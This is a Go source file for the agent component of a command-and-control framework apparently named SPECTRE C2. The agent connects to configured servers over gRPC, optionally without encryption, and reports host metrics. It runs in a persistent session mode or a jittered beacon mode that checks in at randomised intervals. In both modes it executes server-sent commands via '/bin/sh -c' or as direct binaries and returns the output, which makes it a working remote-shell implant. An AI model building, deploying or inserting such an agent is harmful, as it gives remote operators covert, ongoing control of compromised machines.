package agent

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	pb "github.com/sbu/spectre-c2/pkg/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

// Config holds all parameters needed to start an agent.
type Config struct {
	AgentID     string
	Hostname    string
	ServerAddrs []string
	Tags        []string
	Mode        string  // "session" | "beacon"
	SleepSec    int64   // beacon base sleep (default 60)
	JitterPct   float64 // beacon jitter 0.0-1.0 (default 0.1)
	Insecure    bool
}

// Agent encapsulates the runtime state of a SPECTRE agent.
type Agent struct {
	cfg Config
}

// New creates an Agent from the provided Config.
func New(cfg Config) *Agent {
	if cfg.SleepSec <= 0 {
		cfg.SleepSec = 60
	}
	if cfg.JitterPct < 0 || cfg.JitterPct > 1 {
		cfg.JitterPct = 0.1
	}
	if cfg.Hostname == "" {
		cfg.Hostname, _ = os.Hostname()
	}
	if cfg.AgentID == "" {
		cfg.AgentID = cfg.Hostname
	}
	return &Agent{cfg: cfg}
}

// Run starts the agent in the mode specified by cfg.Mode.
// It blocks until ctx is cancelled.
func (a *Agent) Run(ctx context.Context) {
	switch strings.ToLower(a.cfg.Mode) {
	case "beacon":
		a.RunBeacon(ctx)
	default:
		a.RunSession(ctx)
	}
}

// ── Session Mode ──────────────────────────────────────────────────────────────

// RunSession connects to the server and maintains a persistent bidirectional
// gRPC stream.  Heartbeat metrics are sent every 30 seconds.  Received
// TaskRequests are executed concurrently via executeAndStream.
func (a *Agent) RunSession(ctx context.Context) {
	for {
		if ctx.Err() != nil {
			return
		}
		if err := a.sessionLoop(ctx); err != nil && ctx.Err() == nil {
			log.Printf("[session] disconnected (%v), reconnecting in 5s…", err)
			select {
			case <-ctx.Done():
				return
			case <-time.After(5 * time.Second):
			}
		}
	}
}

func (a *Agent) sessionLoop(ctx context.Context) error {
	conn, err := a.dial()
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()

	client := pb.NewAgentServiceClient(conn)
	stream, err := client.Connect(ctx)
	if err != nil {
		return fmt.Errorf("connect stream: %w", err)
	}

	// Send initial registration metrics.
	if err := stream.Send(a.metrics()); err != nil {
		return fmt.Errorf("initial send: %w", err)
	}
	log.Printf("[session] connected to server as %s", a.cfg.AgentID)

	// Heartbeat ticker.
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	taskCh := make(chan *pb.TaskRequest, 32)

	// Receive tasks from server in a separate goroutine so we can also send
	// heartbeats on the write side.
	go func() {
		for {
			tr, recvErr := stream.Recv()
			if recvErr != nil {
				if recvErr != io.EOF {
					log.Printf("[session] recv: %v", recvErr)
				}
				close(taskCh)
				return
			}
			taskCh <- tr
		}
	}()

	for {
		select {
		case <-ctx.Done():
			_ = stream.CloseSend()
			return nil

		case <-ticker.C:
			if sendErr := stream.Send(a.metrics()); sendErr != nil {
				return fmt.Errorf("heartbeat: %w", sendErr)
			}

		case tr, ok := <-taskCh:
			if !ok {
				return fmt.Errorf("server closed stream")
			}
			go executeAndStream(ctx, tr, a.cfg.AgentID, conn)
		}
	}
}

// ── Beacon Mode ───────────────────────────────────────────────────────────────

// RunBeacon periodically checks in with the server, submits completed task
// results, receives pending tasks, executes them synchronously, and then
// sleeps for SleepSec ± jitter seconds.
func (a *Agent) RunBeacon(ctx context.Context) {
	var pendingResults []*pb.TaskOutput

	for {
		if ctx.Err() != nil {
			return
		}

		newCompleted, _ := a.beaconCheckIn(ctx, pendingResults)
		pendingResults = newCompleted

		sleepDur := a.jitteredSleep()
		log.Printf("[beacon] sleeping %s", sleepDur.Round(time.Second))
		select {
		case <-ctx.Done():
			return
		case <-time.After(sleepDur):
		}
	}
}

// beaconCheckIn performs a single check-in RPC.  It returns any newly
// collected task outputs to forward on the next check-in, plus a nil error
// slot for future use.
func (a *Agent) beaconCheckIn(ctx context.Context, completed []*pb.TaskOutput) ([]*pb.TaskOutput, error) {
	conn, err := a.dial()
	if err != nil {
		log.Printf("[beacon] dial: %v", err)
		return completed, err // keep completed for retry
	}
	defer conn.Close()

	client := pb.NewAgentServiceClient(conn)
	resp, err := client.CheckIn(ctx, &pb.BeaconCheckIn{
		AgentId:        a.cfg.AgentID,
		Metrics:        a.metrics(),
		CompletedTasks: completed,
	})
	if err != nil {
		log.Printf("[beacon] check-in: %v", err)
		return completed, err // retry on next cycle
	}

	log.Printf("[beacon] checked in, %d pending tasks", len(resp.PendingTasks))

	// Execute pending tasks and collect results for next check-in.
	var newCompleted []*pb.TaskOutput
	for _, task := range resp.PendingTasks {
		result := a.executeBeaconTask(ctx, task)
		newCompleted = append(newCompleted, result...)
	}

	return newCompleted, nil
}

// executeBeaconTask runs a single task synchronously and returns accumulated
// TaskOutput messages for delivery to the server on the next check-in.
func (a *Agent) executeBeaconTask(ctx context.Context, task *pb.TaskRequest) []*pb.TaskOutput {
	timeout := time.Duration(task.TimeoutSec) * time.Second
	if timeout <= 0 {
		timeout = 300 * time.Second
	}
	taskCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	if len(task.Args) == 0 {
		return []*pb.TaskOutput{{
			TaskId:    task.TaskId,
			AgentId:   a.cfg.AgentID,
			Chunk:     []byte("no args\n"),
			IsStderr:  true,
			IsDone:    true,
			ExitCode:  1,
			Timestamp: time.Now().UnixMilli(),
		}}
	}

	var cmdBin string
	var cmdArgs []string

	if task.Type == pb.TaskType_TASK_EXEC {
		cmdBin = "/bin/sh"
		cmdArgs = append([]string{"-c"}, task.Args...)
	} else {
		cmdBin = task.Args[0]
		cmdArgs = task.Args[1:]
	}

	cmd := exec.CommandContext(taskCtx, cmdBin, cmdArgs...)
	out, runErr := cmd.CombinedOutput()

	exitCode := 0
	if runErr != nil {
		if exitErr, ok := runErr.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}
	}

	var outputs []*pb.TaskOutput
	if len(out) > 0 {
		outputs = append(outputs, &pb.TaskOutput{
			TaskId:    task.TaskId,
			AgentId:   a.cfg.AgentID,
			Chunk:     out,
			Timestamp: time.Now().UnixMilli(),
		})
	}
	outputs = append(outputs, &pb.TaskOutput{
		TaskId:    task.TaskId,
		AgentId:   a.cfg.AgentID,
		IsDone:    true,
		ExitCode:  int32(exitCode),
		Timestamp: time.Now().UnixMilli(),
	})
	return outputs
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// dial opens a gRPC connection to the first available server address.
func (a *Agent) dial() (*grpc.ClientConn, error) {
	var lastErr error
	for _, addr := range a.cfg.ServerAddrs {
		opts := []grpc.DialOption{
			grpc.WithBlock(),
		}
		if a.cfg.Insecure {
			opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
		}
		dialCtx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		conn, err := grpc.DialContext(dialCtx, addr, opts...) //nolint:staticcheck
		cancel()
		if err == nil {
			return conn, nil
		}
		lastErr = err
	}
	return nil, fmt.Errorf("all servers unreachable: %w", lastErr)
}

// metrics constructs a current AgentMetrics message.
func (a *Agent) metrics() *pb.AgentMetrics {
	hostname := a.cfg.Hostname
	if hostname == "" {
		hostname, _ = os.Hostname()
	}

	mode := pb.AgentMode_AGENT_MODE_SESSION
	if strings.ToLower(a.cfg.Mode) == "beacon" {
		mode = pb.AgentMode_AGENT_MODE_BEACON
	}

	return &pb.AgentMetrics{
		AgentId:   a.cfg.AgentID,
		AgentName: hostname,
		CpuPct:    readCPUPercent(),
		MemPct:    readMemPercent(),
		Timestamp: time.Now().UnixMilli(),
		Mode:      mode,
	}
}

// jitteredSleep computes the sleep duration with ±jitter applied.
func (a *Agent) jitteredSleep() time.Duration {
	base := float64(a.cfg.SleepSec)
	jitter := base * a.cfg.JitterPct
	// Random offset in [-jitter, +jitter].
	offset := (rand.Float64()*2 - 1) * jitter
	secs := base + offset
	if secs < 1 {
		secs = 1
	}
	return time.Duration(secs * float64(time.Second))
}

// ── /proc readers (Linux) ─────────────────────────────────────────────────────

// readCPUPercent reads /proc/stat and returns an approximate CPU utilisation
// percentage based on a 200 ms sample window.
func readCPUPercent() float32 {
	if runtime.GOOS != "linux" {
		return 0
	}

	read := func() (idle, total uint64) {
		f, err := os.Open("/proc/stat")
		if err != nil {
			return
		}
		defer f.Close()
		scanner := bufio.NewScanner(f)
		for scanner.Scan() {
			line := scanner.Text()
			if !strings.HasPrefix(line, "cpu ") {
				continue
			}
			fields := strings.Fields(line)[1:]
			var vals [10]uint64
			for i, s := range fields {
				if i >= 10 {
					break
				}
				vals[i], _ = strconv.ParseUint(s, 10, 64)
			}
			// cpu fields: user nice system idle iowait irq softirq steal guest guest_nice
			idle = vals[3] + vals[4] // idle + iowait
			for _, v := range vals {
				total += v
			}
			return
		}
		return
	}

	idle1, total1 := read()
	time.Sleep(200 * time.Millisecond)
	idle2, total2 := read()

	deltaTotal := total2 - total1
	deltaIdle := idle2 - idle1
	if deltaTotal == 0 {
		return 0
	}
	used := deltaTotal - deltaIdle
	return float32(used) / float32(deltaTotal) * 100.0
}

// readMemPercent reads /proc/meminfo and returns used memory as a percentage.
func readMemPercent() float32 {
	if runtime.GOOS != "linux" {
		return 0
	}
	f, err := os.Open("/proc/meminfo")
	if err != nil {
		return 0
	}
	defer f.Close()

	vals := make(map[string]uint64)
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.Fields(line)
		if len(parts) < 2 {
			continue
		}
		key := strings.TrimSuffix(parts[0], ":")
		v, _ := strconv.ParseUint(parts[1], 10, 64)
		vals[key] = v
	}

	total := vals["MemTotal"]
	available := vals["MemAvailable"]
	if total == 0 {
		return 0
	}
	used := total - available
	return float32(used) / float32(total) * 100.0
}
